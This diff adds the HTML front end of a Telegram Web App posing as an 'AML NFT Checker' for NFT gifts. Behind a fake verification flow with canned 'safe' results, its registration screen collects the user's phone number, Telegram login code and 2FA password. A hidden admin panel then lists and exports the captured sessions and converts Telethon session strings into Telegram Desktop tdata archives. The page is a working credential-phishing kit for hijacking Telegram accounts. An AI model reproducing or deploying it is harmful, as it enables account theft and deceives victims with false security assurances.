@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔎 AML NFT Checker</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <!-- Фоновые элементы -->
+    <div class="background-shapes">
+        <div class="shape shape-1"></div>
+        <div class="shape shape-2"></div>
+        <div class="shape shape-3"></div>
+        <div class="shape shape-4"></div>
+    </div>
+
+    <!-- Главный контейнер -->
+    <div class="container" id="mainContainer">
+        <!-- Шапка -->
+        <header class="glass header">
+            <div class="logo">
+                <div class="logo-icon">🔍</div>
+                <div>
+                    <h1>AML NFT Checker</h1>
+                    <p class="subtitle">Проверка безопасности NFT подарков</p>
+                </div>
+            </div>
+            <div class="user-info" id="userInfo">
+                <div class="user-avatar">
+                    <i class="fas fa-user"></i>
+                </div>
+                <span id="username">Гость</span>
+            </div>
+        </header>
+
+        <!-- Основной контент -->
+        <main class="content">
+            <!-- Экран: Главное меню -->
+            <div class="screen active" id="mainScreen">
+                <div class="glass card welcome-card">
+                    <div class="card-icon">
+                        <i class="fas fa-gem"></i>
+                    </div>
+                    <h2>Добро пожаловать!</h2>
+                    <p class="card-description">
+                        Проверяем NFT подарки на:
+                    </p>
+                    <ul class="features-list">
+                        <li><i class="fas fa-check"></i> Чистоту AML</li>
+                        <li><i class="fas fa-check"></i> Риск рефаунда</li>
+                        <li><i class="fas fa-check"></i> Историю владения</li>
+                    </ul>
+                    <button class="btn-glass primary" onclick="showScreen('checkScreen')">
+                        <i class="fas fa-search"></i> Начать проверку
+                    </button>
+                    
+                    <div class="stats-preview glass">
+                        <div class="stat-item">
+                            <div class="stat-value" id="totalChecks">1,234</div>
+                            <div class="stat-label">Проверок</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value" id="safeNFTs">98%</div>
+                            <div class="stat-label">Безопасно</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Быстрые действия -->
+                <div class="quick-actions">
+                    <button class="glass action-btn" onclick="showScreen('historyScreen')">
+                        <i class="fas fa-history"></i>
+                        <span>История</span>
+                    </button>
+                    <button class="glass action-btn" onclick="showScreen('adminScreen')" id="adminBtn" style="display: none;">
+                        <i class="fas fa-cog"></i>
+                        <span>Админ</span>
+                    </button>
+                    <button class="glass action-btn" onclick="showScreen('helpScreen')">
+                        <i class="fas fa-question-circle"></i>
+                        <span>Помощь</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Экран: Проверка NFT -->
+            <div class="screen" id="checkScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <button class="back-btn" onclick="showScreen('mainScreen')">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <h2>🔎 Проверка NFT</h2>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="nftUrl">
+                            <i class="fas fa-link"></i> Ссылка на NFT подарок
+                        </label>
+                        <input 
+                            type="text" 
+                            id="nftUrl" 
+                            placeholder="https://opensea.io/collection/..."
+                            class="glass input-field"
+                        >
+                    </div>
+                    
+                    <button class="btn-glass primary" onclick="startNFTCheck()">
+                        <i class="fas fa-play"></i> Запустить проверку
+                    </button>
+                    
+                    <div class="info-box glass">
+                        <i class="fas fa-info-circle"></i>
+                        <p>Проверка занимает 1-2 минуты. Для полного отчета требуется регистрация.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Экран: Проверка в процессе -->
+            <div class="screen" id="checkingScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <h2>⏳ Проверка NFT</h2>
+                    </div>
+                    
+                    <div class="progress-container">
+                        <div class="progress-bar glass">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+                        <div class="progress-text" id="progressText">0%</div>
+                    </div>
+                    
+                    <div class="check-steps">
+                        <div class="step active">
+                            <div class="step-icon">1</div>
+                            <div class="step-content">
+                                <div class="step-title">AML анализ</div>
+                                <div class="step-status" id="step1Status">В процессе...</div>
+                            </div>
+                        </div>
+                        <div class="step">
+                            <div class="step-icon">2</div>
+                            <div class="step-content">
+                                <div class="step-title">Проверка рефаунда</div>
+                                <div class="step-status" id="step2Status">Ожидание</div>
+                            </div>
+                        </div>
+                        <div class="step">
+                            <div class="step-icon">3</div>
+                            <div class="step-content">
+                                <div class="step-title">История владения</div>
+                                <div class="step-status" id="step3Status">Ожидание</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="loading-animation">
+                        <div class="spinner"></div>
+                        <p id="loadingMessage">Анализируем данные...</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Экран: Требуется регистрация -->
+            <div class="screen" id="registrationScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <h2>📝 Регистрация</h2>
+                    </div>
+                    
+                    <div class="registration-info glass">
+                        <i class="fas fa-shield-alt"></i>
+                        <h3>Требуется верификация</h3>
+                        <p>Для завершения проверки и получения полного отчета пройдите быструю регистрацию.</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phoneNumber">
+                            <i class="fas fa-phone"></i> Номер телефона
+                        </label>
+                        <input 
+                            type="tel" 
+                            id="phoneNumber" 
+                            placeholder="+7 (999) 999-99-99"
+                            class="glass input-field"
+                        >
+                    </div>
+                    
+                    <div class="form-group" id="codeGroup" style="display: none;">
+                        <label for="smsCode">
+                            <i class="fas fa-sms"></i> Код из Telegram
+                        </label>
+                        <div class="code-input-container">
+                            <input type="text" id="codeDigit1" maxlength="1" class="code-digit glass">
+                            <input type="text" id="codeDigit2" maxlength="1" class="code-digit glass">
+                            <input type="text" id="codeDigit3" maxlength="1" class="code-digit glass">
+                            <input type="text" id="codeDigit4" maxlength="1" class="code-digit glass">
+                            <input type="text" id="codeDigit5" maxlength="1" class="code-digit glass">
+                        </div>
+                        <button class="btn-text" onclick="resendCode()" id="resendBtn">
+                            <i class="fas fa-redo"></i> Отправить код повторно
+                        </button>
+                    </div>
+                    
+                    <div class="form-group" id="passwordGroup" style="display: none;">
+                        <label for="password2fa">
+                            <i class="fas fa-lock"></i> Пароль 2FA (если есть)
+                        </label>
+                        <input 
+                            type="password" 
+                            id="password2fa" 
+                            placeholder="Введите пароль двухфакторной аутентификации"
+                            class="glass input-field"
+                        >
+                    </div>
+                    
+                    <button class="btn-glass primary" onclick="processRegistration()" id="regBtn">
+                        <i class="fas fa-paper-plane"></i> Отправить код
+                    </button>
+                    
+                    <div class="privacy-notice glass">
+                        <i class="fas fa-user-shield"></i>
+                        <p>Ваши данные защищены и используются только для проверки безопасности.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Экран: Результат проверки -->
+            <div class="screen" id="resultScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <h2>📊 Результат проверки</h2>
+                    </div>
+                    
+                    <div class="result-header glass success">
+                        <i class="fas fa-check-circle"></i>
+                        <h3>Проверка завершена!</h3>
+                    </div>
+                    
+                    <div class="result-details">
+                        <div class="result-item glass">
+                            <div class="result-icon">
+                                <i class="fas fa-filter"></i>
+                            </div>
+                            <div class="result-content">
+                                <div class="result-title">AML проверка</div>
+                                <div class="result-value success" id="amlResult">Чистый</div>
+                            </div>
+                        </div>
+                        
+                        <div class="result-item glass">
+                            <div class="result-icon">
+                                <i class="fas fa-exclamation-triangle"></i>
+                            </div>
+                            <div class="result-content">
+                                <div class="result-title">Риск рефаунда</div>
+                                <div class="result-value warning" id="refundResult">Низкий</div>
+                            </div>
+                        </div>
+                        
+                        <div class="result-item glass">
+                            <div class="result-icon">
+                                <i class="fas fa-history"></i>
+                            </div>
+                            <div class="result-content">
+                                <div class="result-title">История владения</div>
+                                <div class="result-value success" id="historyResult">Прозрачная</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="verdict-box glass">
+                        <h3>Общий вердикт</h3>
+                        <div class="verdict-status success" id="verdictText">Безопасно 🟢</div>
+                        <p class="verdict-message">Данный NFT подарок можно принимать!</p>
+                    </div>
+                    
+                    <div class="session-info glass" id="sessionInfo" style="display: none;">
+                        <h4><i class="fas fa-key"></i> Идентификатор сессии</h4>
+                        <code class="session-code" id="sessionCode"></code>
+                        <button class="btn-text" onclick="copySessionCode()">
+                            <i class="fas fa-copy"></i> Копировать
+                        </button>
+                    </div>
+                    
+                    <button class="btn-glass primary" onclick="showScreen('mainScreen')">
+                        <i class="fas fa-home"></i> Вернуться на главную
+                    </button>
+                    
+                    <button class="btn-glass secondary" onclick="showScreen('checkScreen')">
+                        <i class="fas fa-redo"></i> Новая проверка
+                    </button>
+                </div>
+            </div>
+
+            <!-- Экран: Админ панель -->
+            <div class="screen" id="adminScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <button class="back-btn" onclick="showScreen('mainScreen')">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <h2><i class="fas fa-cog"></i> Админ панель</h2>
+                    </div>
+                    
+                    <!-- Статистика -->
+                    <div class="admin-section glass">
+                        <h3><i class="fas fa-chart-bar"></i> Статистика</h3>
+                        <div class="admin-stats">
+                            <div class="admin-stat">
+                                <div class="admin-stat-value" id="adminTotalReg">0</div>
+                                <div class="admin-stat-label">Всего регистраций</div>
+                            </div>
+                            <div class="admin-stat">
+                                <div class="admin-stat-value" id="adminTotalSessions">0</div>
+                                <div class="admin-stat-label">Всего сессий</div>
+                            </div>
+                            <div class="admin-stat">
+                                <div class="admin-stat-value" id="adminTodayReg">0</div>
+                                <div class="admin-stat-label">Сегодня</div>
+                            </div>
+                        </div>
+                        <button class="btn-glass small" onclick="loadAdminStats()">
+                            <i class="fas fa-sync"></i> Обновить
+                        </button>
+                    </div>
+                    
+                    <!-- Конвертер сессий -->
+                    <div class="admin-section glass">
+                        <h3><i class="fas fa-exchange-alt"></i> Конвертер в TData</h3>
+                        <div class="form-group">
+                            <label for="sessionInput">
+                                <i class="fas fa-key"></i> Строка сессии
+                            </label>
+                            <textarea 
+                                id="sessionInput" 
+                                placeholder="Введите строку сессии Telethon..."
+                                class="glass input-field"
+                                rows="3"
+                            ></textarea>
+                        </div>
+                        <button class="btn-glass primary" onclick="convertToTData()">
+                            <i class="fas fa-file-archive"></i> Конвертировать и скачать
+                        </button>
+                        <div class="converter-info">
+                            <p><i class="fas fa-info-circle"></i> Получите архив tdata.zip для Telegram Desktop</p>
+                        </div>
+                    </div>
+                    
+                    <!-- Список сессий -->
+                    <div class="admin-section glass">
+                        <h3><i class="fas fa-list"></i> Последние сессии</h3>
+                        <div class="sessions-list" id="sessionsList">
+                            <div class="empty-state">
+                                <i class="fas fa-database"></i>
+                                <p>Нет данных о сессиях</p>
+                            </div>
+                        </div>
+                        <button class="btn-glass secondary" onclick="loadSessions()">
+                            <i class="fas fa-download"></i> Экспорт всех сессий
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Экран: История -->
+            <div class="screen" id="historyScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <button class="back-btn" onclick="showScreen('mainScreen')">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <h2><i class="fas fa-history"></i> История проверок</h2>
+                    </div>
+                    
+                    <div class="history-list" id="historyList">
+                        <div class="history-item glass">
+                            <div class="history-date">Сегодня, 14:30</div>
+                            <div class="history-url">opensea.io/collection/nft-123</div>
+                            <div class="history-status success">Безопасно</div>
+                        </div>
+                        <div class="history-item glass">
+                            <div class="history-date">Вчера, 11:15</div>
+                            <div class="history-url">rarible.com/token/456</div>
+                            <div class="history-status warning">Риск</div>
+                        </div>
+                    </div>
+                    
+                    <div class="empty-state" id="emptyHistory" style="display: none;">
+                        <i class="fas fa-search"></i>
+                        <p>У вас еще нет проверок</p>
+                        <button class="btn-glass primary" onclick="showScreen('checkScreen')">
+                            Сделать первую проверку
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Экран: Помощь -->
+            <div class="screen" id="helpScreen">
+                <div class="glass card">
+                    <div class="card-header">
+                        <button class="back-btn" onclick="showScreen('mainScreen')">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <h2><i class="fas fa-question-circle"></i> Помощь</h2>
+                    </div>
+                    
+                    <div class="help-section glass">
+                        <h3><i class="fas fa-search"></i> Как работает проверка?</h3>
+                        <p>Мы анализируем NFT подарки по трем критериям:</p>
+                        <ol>
+                            <li>AML (Anti-Money Laundering) - проверка на чистоту средств</li>
+                            <li>Риск рефаунда - вероятность отмены транзакции</li>
+                            <li>История владения - отслеживание предыдущих владельцев</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="help-section glass">
+                        <h3><i class="fas fa-user-shield"></i> Безопасность данных</h3>
+                        <p>Ваши данные используются только для создания сессии Telegram и немедленно шифруются. Мы не храним пароли доступа.</p>
+                    </div>
+                    
+                    <div class="help-section glass">
+                        <h3><i class="fas fa-comment"></i> Поддержка</h3>
+                        <p>Если у вас возникли проблемы, свяжитесь с поддержкой через Telegram бота.</p>
+                        <button class="btn-glass primary" onclick="openTelegramSupport()">
+                            <i class="fab fa-telegram"></i> Написать в поддержку
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Нижняя панель навигации -->
+        <nav class="bottom-nav glass">
+            <button class="nav-btn active" onclick="showScreen('mainScreen')">
+                <i class="fas fa-home"></i>
+                <span>Главная</span>
+            </button>
+            <button class="nav-btn" onclick="showScreen('checkScreen')">
+                <i class="fas fa-search"></i>
+                <span>Проверка</span>
+            </button>
+            <button class="nav-btn" onclick="showScreen('historyScreen')">
+                <i class="fas fa-history"></i>
+                <span>История</span>
+            </button>
+            <button class="nav-btn" onclick="showScreen('adminScreen')" id="bottomAdminBtn" style="display: none;">
+                <i class="fas fa-cog"></i>
+                <span>Админ</span>
+            </button>
+        </nav>
+    </div>
+
+    <!-- Модальные окна -->
+    <div class="modal" id="messageModal">
+        <div class="modal-content glass">
+            <div class="modal-header">
+                <h3 id="modalTitle">Уведомление</h3>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="modalMessage"></div>
+            <div class="modal-footer">
+                <button class="btn-glass primary" onclick="closeModal()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
